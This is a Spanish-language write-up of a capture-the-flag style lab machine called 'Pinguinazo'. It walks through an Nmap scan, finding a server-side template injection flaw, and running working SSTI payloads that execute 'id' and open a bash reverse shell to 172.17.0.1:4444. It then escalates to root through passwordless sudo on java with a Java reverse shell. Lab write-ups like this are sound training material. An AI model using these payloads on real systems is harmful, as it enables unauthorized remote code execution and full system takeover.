# Pinguinazo

## 🔎 Enumeración

Se realiza un escaneo de puertos con **Nmap**, donde se identifica el puerto 5000/tcp (HTTP) como único servicio expuesto

<img width="795" height="148" alt="Pasted image 20260107111541" src="https://github.com/user-attachments/assets/bbf96e98-4d06-42ce-be36-8999f8a875fe" />

## 🌐 Análisis de la aplicación web

Al acceder a la aplicación web, se realizan pruebas básicas para identificar posibles vulnerabilidades 

<img width="1261" height="565" alt="Pasted image 20260107111636" src="https://github.com/user-attachments/assets/293b05a8-c8d0-4510-895d-9e50c2a4d8f2" />

Durante las pruebas se detecta que la aplicación es vulnerable a **SSTI** ```(Server-Side Template Injection)```

<img width="868" height="250" alt="Pasted image 20260107114440" src="https://github.com/user-attachments/assets/64ec672e-2c8e-4600-89f4-2260d7df10a4" />

Y en efecto

<img width="645" height="103" alt="Pasted image 20260107114525" src="https://github.com/user-attachments/assets/50e8a4d2-5b20-49e2-a438-bc6459296dc5" />

Se ejecuta el siguiente payload:

```shell
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

<img width="788" height="110" alt="Pasted image 20260107115021" src="https://github.com/user-attachments/assets/0355bea1-81ec-436f-9827-ea44c68157f2" />

El servidor responde correctamente, confirmando la ejecución remota de comandos

## 🔓 Obtención de acceso inicial

Aprovechando la vulnerabilidad ```SSTI```, se envía una reverse shell mediante el siguiente payload

```shell
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"').read()}}
```

<img width="1157" height="123" alt="Pasted image 20260107115333" src="https://github.com/user-attachments/assets/bc2aa897-56b5-4d8d-b8b5-362da0a67afc" />

Se inicia un listener en el puerto correspondiente y se obtiene acceso al sistema

<img width="692" height="251" alt="Pasted image 20260107115530" src="https://github.com/user-attachments/assets/d92a0254-470a-4306-ba3c-51fd2620457f" />

Se realiza tratamiento de TTY

<img width="240" height="140" alt="Pasted image 20251222222913" src="https://github.com/user-attachments/assets/f8b4cee6-3d53-48b2-a301-abbdf89aba8f" />

## 🔐 Escalada de privilegios

Una vez dentro, se revisan los permisos del usuario y se detecta que es posible ejecutar binarios **Java** como **root** sin contraseña

<img width="1003" height="155" alt="Pasted image 20260107125706" src="https://github.com/user-attachments/assets/26c92dc4-bc70-4c69-b386-72097a5bf744" />

Se genera una reverse shell en **Java**, gracias a [Reverse Shell Generator](https://www.revshells.com/)

<img width="1117" height="800" alt="Pasted image 20260107132034" src="https://github.com/user-attachments/assets/b68480f7-b9be-4892-a61f-369d23f05dba" />

Se guarda en un archivo *.java* y se ejecuta

<img width="868" height="283" alt="Pasted image 20260107130839" src="https://github.com/user-attachments/assets/a5ee8599-c532-436b-b205-29202850948a" />

```shell
sudo java reverse.java
```

<img width="1112" height="53" alt="Pasted image 20260107131518" src="https://github.com/user-attachments/assets/643c4a5b-5854-45d7-a048-338fb6881e73" />

En otra terminal, se coloca el listener correspondiente y se obtiene una sesión como **root**, logrando así el control total del sistema

<img width="797" height="222" alt="Pasted image 20260107131619" src="https://github.com/user-attachments/assets/53c7ebef-2d29-420e-9c1d-f1cd73bf908e" />

## 🏁 Conclusión

La explotación de una vulnerabilidad SSTI permitió la ejecución remota de comandos, el acceso inicial al sistema y, posteriormente, la escalada de privilegios hasta root debido a una mala configuración de permisos.
